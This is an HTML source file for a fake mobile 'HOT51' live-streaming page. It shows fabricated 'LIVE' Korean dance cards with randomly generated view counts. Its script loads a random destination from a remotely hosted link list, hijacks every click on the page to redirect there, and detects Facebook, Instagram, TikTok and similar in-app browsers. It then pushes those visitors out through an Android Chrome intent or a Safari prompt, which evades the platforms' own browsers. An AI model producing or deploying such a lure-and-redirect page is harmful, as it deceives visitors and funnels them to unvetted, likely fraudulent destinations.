<!DOCTYPE html>
<html lang="en">
<head>
    <!-- ========================================== -->
    <!-- JAVASCRIPT CONFIGURATION                   -->
    <!-- ========================================== -->
    <script>
        const WEB_CONFIG = {
            // 1. TARGET URL (Default/Fallback if fetch fails)
            targetUrl: "https://spreadpreferencetelevision.com/nx0mqssqb?key=3b6c383d0fe4dfbd2cebe336916a95f1", 
            
            // 2. PAGE TITLE
            pageTitle: "HOT51",

            // 3. THUMBNAIL LIST (Auto-generate 32 items with Korean Dance niche)
            thumbnails: (function() {
                let items = [];
                const danceNames = [
                    "K-Pop Dance Cover 💃", "Seoul Vibes Live", "Idol Practice Room", 
                    "Cute Dancer 💋", "Hongdae Busking", "Korean Girl Dance", 
                    "Studio Live 💦", "Night Dance", "K-Dance Vibes", "Secret Dance <3"
                ];
                
                for(let i = 1; i <= 32; i++) {
                    items.push({
                        image: `https://joinroom.github.io/x/${i}.png`,
                        name: danceNames[i % danceNames.length],
                        views: (Math.random() * (5.5 - 1.1) + 1.1).toFixed(2) + "M",
                        location: "South Korea",
                        badge: "https://img.icons8.com/color/48/dice.png"
                    });
                }
                return items;
            })()
        };
    </script>
    <!-- ========================================== -->

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HOT51 - Live Streaming</title>
    <!-- FontAwesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
            user-select: none;
            cursor: pointer;
        }

        body {
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
        }

        .mobile-container {
            width: 100%;
            max-width: 414px;
            background-color: #ffffff;
            min-height: 100vh;
            position: relative;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            overflow-x: hidden;
            padding-bottom: 80px; 
        }

        /* HEADER */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 15px;
            background: #fff;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .header-left i.fa-bars {
            font-size: 20px;
            color: #333;
        }

        .logo-group {
            display: flex;
            align-items: center;
            gap: 5px;
            font-weight: 700;
            font-size: 18px;
            color: #000;
        }

        .logo-icon {
            width: 25px;
            height: 25px;
            background: linear-gradient(135deg, #ff007f, #4a00e0);
            border-radius: 4px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 12px;
        }

        .header-right {
            display: flex;
            gap: 8px;
        }

        .btn-header {
            display: flex;
            align-items: center;
            gap: 5px;
            padding: 4px 10px;
            border: 1px solid #ff4d6d;
            border-radius: 20px;
            color: #ff4d6d;
            font-size: 12px;
            font-weight: 600;
            background: #fff;
        }

        /* GRID THUMBNAIL - 1 Per Row */
        .grid-container {
            display: grid;
            grid-template-columns: 1fr; /* Changed to 1 thumbnail per row */
            gap: 15px;
            padding: 10px 15px;
        }

        .card {
            position: relative;
            border-radius: 12px;
            overflow: hidden;
            aspect-ratio: 16/9; /* 16:9 Ratio */
            background-color: #333;
            background-size: cover;
            background-position: center;
        }

        .card::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 50%;
            background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent 100%);
            pointer-events: none;
        }

        .card-top {
            position: absolute;
            top: 10px;
            left: 10px;
            right: 10px;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            z-index: 2;
        }

        .badges-left {
            display: flex;
            gap: 4px;
        }

        .badge-circle {
            width: 35px;
            height: 35px;
            border-radius: 50%;
            background-color: #fff;
            border: 2px solid #ddd;
            background-size: cover;
            background-position: center;
        }

        .stats-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 5px;
        }

        .views {
            background: rgba(0, 0, 0, 0.5);
            padding: 3px 8px;
            border-radius: 12px;
            color: #fff;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .views i {
            color: #ffaa00;
        }

        .live-icon {
            background-color: #ff0033;
            color: white;
            font-size: 10px;
            font-weight: bold;
            padding: 4px 8px;
            border-radius: 4px;
            letter-spacing: 1px;
            display: inline-block;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }

        .card-bottom {
            position: absolute;
            bottom: 12px;
            left: 12px;
            right: 12px;
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            z-index: 2;
        }

        .name {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 70%;
        }

        .location {
            color: #ccc;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        /* NEXT BUTTON */
        .next-btn-wrapper {
            padding: 5px 15px 20px 15px;
        }

        .next-btn {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            padding: 15px 0;
            background: linear-gradient(135deg, #ff007f, #4a00e0);
            color: white;
            font-size: 16px;
            font-weight: 700;
            border-radius: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 4px 15px rgba(255, 0, 127, 0.3);
            transition: 0.2s;
        }
        
        .next-btn:active {
            transform: scale(0.98);
        }

        /* BOTTOM NAV */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            width: 100%;
            max-width: 414px;
            background: #fff;
            display: flex;
            justify-content: space-between;
            padding: 10px 20px;
            border-top: 1px solid #f0f0f0;
            z-index: 100;
        }

        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            color: #888;
            font-size: 10px;
        }

        .nav-item i {
            font-size: 20px;
        }

        .nav-item.active {
            color: #ffaa00;
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <!-- HEADER -->
        <header>
            <div class="header-left">
                <i class="fas fa-bars"></i>
                <div class="logo-group">
                    <div class="logo-icon"><i class="fas fa-heart"></i></div>
                    <span id="header-title">HOT51.COM</span>
                </div>
            </div>
            <div class="header-right">
                <div class="btn-header"><i class="fas fa-download"></i> APP</div>
                <div class="btn-header"><i class="fas fa-user-circle"></i> FAQ</div>
            </div>
        </header>

        <!-- GRID CONTENT -->
        <main class="grid-container" id="grid-container">
            <!-- 5 Thumbnails will be generated here -->
        </main>

        <!-- NEXT BUTTON CTA -->
        <div class="next-btn-wrapper">
            <div class="next-btn">
                NEXT <i class="fas fa-chevron-right" style="margin-left: 8px;"></i>
            </div>
        </div>

        <!-- BOTTOM NAV -->
        <nav class="bottom-nav">
            <div class="nav-item">
                <i class="fa-solid fa-house"></i>
                <span>Home</span>
            </div>
            <div class="nav-item active">
                <i class="fa-solid fa-play-circle"></i>
                <span>Live</span>
            </div>
            <div class="nav-item">
                <i class="fa-solid fa-gamepad"></i>
                <span>Games</span>
            </div>
            <div class="nav-item">
                <i class="fa-solid fa-gift"></i>
                <span>Activity</span>
            </div>
            <div class="nav-item">
                <i class="fa-regular fa-user"></i>
                <span>Me</span>
            </div>
        </nav>
    </div>

    <!-- RENDER LOGIC & IN-APP BROWSER DETECTOR -->
    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            
            // 0. FETCH RANDOM LINK FROM EXTERNAL TXT
            try {
                const response = await fetch("https://seribudollarperhari.github.io/banner/link.txt");
                const text = await response.text();
                
                const links = text.split('\n').map(link => link.trim()).filter(link => link.length > 0);
                
                if (links.length > 0) {
                    const randomLink = links[Math.floor(Math.random() * links.length)];
                    WEB_CONFIG.targetUrl = randomLink;
                }
            } catch (error) {
                console.error("Failed to fetch target link list. Using default:", error);
            }

            // 1. SET TITLE & RENDER 5 THUMBNAILS
            document.title = WEB_CONFIG.pageTitle;
            document.getElementById('header-title').innerText = WEB_CONFIG.pageTitle;

            function shuffleArray(array) {
                let shuffled = array.slice();
                for (let i = shuffled.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
                }
                return shuffled;
            }

            // Shuffle 32 items and only take the first 5
            const displayThumbnails = shuffleArray(WEB_CONFIG.thumbnails).slice(0, 5);
            const gridContainer = document.getElementById('grid-container');

            displayThumbnails.forEach(item => {
                const cardHTML = `
                    <div class="card" style="background-image: url('${item.image}');">
                        <div class="card-top">
                            <div class="badges-left">
                                <div class="badge-circle" style="background-image: url('${item.badge}');"></div>
                            </div>
                            <div class="stats-right">
                                <div class="views"><i class="fas fa-fire"></i> ${item.views}</div>
                                <div class="live-icon">LIVE</div>
                            </div>
                        </div>
                        <div class="card-bottom">
                            <div class="name">${item.name}</div>
                            <div class="location"><i class="fas fa-map-marker-alt"></i> ${item.location}</div>
                        </div>
                    </div>
                `;
                gridContainer.insertAdjacentHTML('beforeend', cardHTML);
            });

            // 2. IN-APP BROWSER DETECTOR
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const isInAppBrowser = /FBAN|FBAV|Instagram|TikTok|Line|Twitter|Threads/i.test(ua);
            const isAndroid = /android/i.test(ua);
            const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
            
            if (isInAppBrowser) {
                let parsedUrl;
                try {
                    parsedUrl = new URL(WEB_CONFIG.targetUrl);
                } catch(e) {
                    parsedUrl = new URL("https://" + WEB_CONFIG.targetUrl.replace(/^https?:\/\//, ''));
                }
                
                let intentTarget = parsedUrl.host + parsedUrl.pathname + parsedUrl.search;
                let normalHref = parsedUrl.href;
                let fallbackEncoded = encodeURIComponent(normalHref);
                
                let actionHTML = '';
                if (isAndroid) {
                    const intentUrl = `intent://${intentTarget}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${fallbackEncoded};end`;
                    actionHTML = `<a href="${intentUrl}" class="ia-btn primary">Join Live</a>`;
                } else if (isIOS) {
                    actionHTML = `<span style="font-size:13px; color:#666; text-align:right; font-weight:600;">Tap <b>...</b> (menu)<br>Open in Safari</span>`;
                } else {
                    actionHTML = `<a href="${normalHref}" class="ia-btn primary">Join Live</a>`;
                }
                
                const sheetCSS = `<style>
                    .ia-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:999998;display:flex;align-items:flex-end;justify-content:center}
                    .ia-sheet{width:100%;max-width:414px;background:#fff;border-radius:20px 20px 0 0;padding:25px 20px;font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;box-shadow:0 -4px 15px rgba(0,0,0,0.1);animation:slideUp 0.3s ease-out forwards; margin:0 auto;}
                    @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
                    .ia-header{text-align:center;font-size:18px;font-weight:700;color:#050505;padding-bottom:15px;border-bottom:1px solid #ced0d4;margin-bottom:20px}
                    .ia-row{display:flex;align-items:center;justify-content:space-between}
                    .ia-left{display:flex;align-items:center;gap:12px}
                    .ia-icon{width:42px;height:42px; border-radius: 50%; background-color:#ff4d6d; display:flex; justify-content:center; align-items:center; color:white; font-size:18px;}
                    .ia-text{font-size:16px;font-weight:600;color:#050505}
                    .ia-btn{background:#e4e6eb;color:#050505;font-size:15px;font-weight:600;padding:10px 24px;border-radius:24px;text-decoration:none;transition:0.2s}
                    .ia-btn.primary{background:#ff4d6d;color:#fff}
                </style>`;
                
                const sheetHTML = `
                <div class="ia-overlay">
                    <div class="ia-sheet">
                        <div class="ia-header">Join Live</div>
                        <div class="ia-row">
                            <div class="ia-left">
                                <div class="ia-icon"><i class="fas fa-play"></i></div>
                                <span class="ia-text">Join live</span>
                            </div>
                            ${actionHTML}
                        </div>
                    </div>
                </div>`;
                
                document.body.style.overflow = 'hidden';
                document.body.insertAdjacentHTML('beforeend', sheetCSS + sheetHTML);
            }

            // 3. GLOBAL CLICK DIRECTORY
            document.body.addEventListener('click', function(e) {
                // Ignore if clicked on the in-app browser overlay 
                if (e.target.closest('.ia-overlay')) return;
                
                e.preventDefault();
                window.location.href = WEB_CONFIG.targetUrl;
            });
        });
    </script>
</body>
</html>
